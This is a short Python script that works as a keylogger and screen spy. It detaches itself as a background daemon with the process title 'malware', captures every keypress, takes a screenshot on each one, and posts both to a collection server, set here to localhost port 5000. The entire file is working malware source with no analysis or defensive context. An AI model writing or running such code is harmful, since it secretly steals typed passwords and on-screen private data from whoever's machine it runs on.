import os
import sys
import pyscreenshot
import requests
from io import BytesIO
from setproctitle import setproctitle
from pynput.keyboard import Listener


def on_press(key):
    img = pyscreenshot.grab()

    img_bytes = BytesIO()
    img.save(img_bytes, 'jpeg')

    requests.post('http://localhost:5000',
                  data={'key': str(key)},
                  files={'img': img_bytes})


def main():
    with Listener(on_press=on_press) as listener:
        while True:
            listener.join()


def daemonize():
    pid = os.fork()

    if pid == 0:
        os.setsid()

        setproctitle('malware')

        main()
    else:
        sys.exit(0)


daemonize()
